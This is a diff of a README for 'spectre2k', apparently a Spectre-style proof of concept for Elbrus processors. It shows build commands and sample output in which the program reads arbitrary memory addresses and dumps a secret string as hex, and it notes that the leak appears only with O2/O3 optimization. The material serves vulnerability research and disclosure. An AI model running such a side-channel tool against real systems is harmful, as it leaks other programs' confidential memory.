@@ -5,37 +5,56 @@ Build with optimizations (O2 or O3) and run.
 ```
 $ lcc -O2 main.c -o spectre2k
 $ ./spectre2k
-Hello OpenE2K
-$ ./spectre2k 'Hello, world'
-Hello, world!
+usage: ./spectre2k 0x13080 13
+
+secret address: 0x13080
+secret len: 13
+secret data: "Hello OpenE2K"
+
+target address: 0x13080
+target len: 13
+target data:
+
+0000000000013080 | 48 65 6c 6c 6f 20 4f 70 65 6e 45 32 4b 00 00 00 | Hello OpenE2K...
+
+# You can pass address and length to read
+$ ./spectre2k 0x13070 128
+usage: ./spectre2k 0x13070 128
+
+secret address: 0x13080
+secret len: 13
+secret data: "Hello OpenE2K"
+
+target address: 0x13070
+target len: 128
+target data:
+
+0000000000013070 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+0000000000013080 | 48 65 6c 6c 6f 20 4f 70 65 6e 45 32 4b 00 00 00 | Hello OpenE2K...
+0000000000013090 | 68 0a 01 00 00 00 00 00 00 00 00 00 00 00 00 00 | h...............
+00000000000130a0 | a0 48 29 06 55 46 00 00 00 00 00 00 00 00 00 00 | .H).UF..........
+00000000000130b0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+00000000000130c0 | 40 c0 be 01 00 00 00 00 00 00 00 00 00 00 00 00 | @...............
+00000000000130d0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+00000000000130e0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
 ```
 
-Lower level of optimizations (O0 or O1) does not have vulnerability.
+Without compiler optimizations it will not work because compiler will not produce speculative loads.
 
 ```
 $ lcc -O1 main.c -o spectre2k
 $ ./spectre2k
-\\x04\\x0c\\x0b\\x1b\\x1b\\x0c\\x13+\\x13\\x0b\\x14\\x13\\x0b
-$ ./spectre2k
-\\x07\\x07\\x17\\x07\\x07\\x07\\x08\\x07\\x18\\x17\\x1f\\x0f\\x0f
-```
+usage: ./spectre2k 0x13080 13
 
-Protected mode (ЗРИ/ТБВ) also has vulnerability with high level of optimizations (O2/O3):
+secret address: 0x13080
+secret len: 13
+secret data: "Hello OpenE2K"
 
-```
-$ lcc -O2 -mptr128 main.c -o spectre2k
-$ ./spectre2k
-Hello OpenE2K
-```
+target address: 0x13080
+target len: 13
+target data:
 
-Similarly, O0 and O1 levels of optimization are free from vulnerability:
-
-```
-$ lcc -O1 -mptr128 main.c -o spectre2k
-$ ./spectre2k
-\\x06\\x06\\x07\\x07\\x0e\\x06\\x06\\x07\\x06\\x07\\x06\\x0e\\x07
-$ ./spectre2k
-\\x06\\x06\\x06\\x06\\x0f\\x06\\x06\\x06\\x06\\x06\\x06\\x07\\x06
+0000000000013080 | .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. | ................
 ```
 
 Used LCC version:
